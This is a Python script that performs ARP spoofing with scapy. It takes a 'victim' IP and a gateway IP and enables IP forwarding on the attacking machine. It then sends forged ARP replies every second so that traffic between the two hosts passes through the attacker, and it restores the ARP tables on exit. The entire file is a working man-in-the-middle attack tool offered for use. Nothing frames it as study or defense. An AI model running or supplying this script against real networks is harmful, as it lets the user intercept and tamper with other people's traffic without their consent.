#!/usr/bin/env python3
import argparse
import subprocess
import time
import scapy.all as scapy

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-v", "--victim", dest="victim", help="Enter the IP of your poor victim.")
    parser.add_argument("-s", "--spoof", dest="spoof", help="Enter the spoof IP. The IP you wish you're victim to think it's yours i.e: router, gatway, accesspoint, etc..")
    return parser.parse_args()

def get_mac(ip):
    broadcast   = scapy.Ether(dst="FF:FF:FF:FF:FF:FF")
    request     = scapy.ARP(pdst=ip)
    response    = scapy.srp(broadcast/request, verbose=0, retry=1, timeout=1)[0]
    return response[0][1].hwsrc

def spoof(victim_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=get_mac(victim_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=0)

def restore(target_ip, source_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=source_ip, hwsrc=get_mac(source_ip))
    scapy.send(packet, verbose=0)

def ip_forward(toggle):
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward="+str(toggle)], stdout=subprocess.DEVNULL)


ip = get_args()
try:
    ip_forward(1)
    print("[+] Enabling port-forwarding on this machine...")
    counter = 0
    while True:
        spoof(ip.victim, ip.spoof)
        spoof(ip.spoof, ip.victim)
        time.sleep(1)
        counter+=2
        print("\r[+] Total packets sent: "+ str(counter) +".", end="")
except KeyboardInterrupt:
    print("\n[-] Quiting please wait...")
    print("[-] Disableing IP forwarding...")
    ip_forward(0)
    print("[+] Restoring default Addresses...")
    restore(ip.victim, ip.spoof)
    restore(ip.spoof, ip.victim)
    time.sleep(1)
    print("[+] Restoration Successfull!")






#print(packet.show())
#print(packet.summary())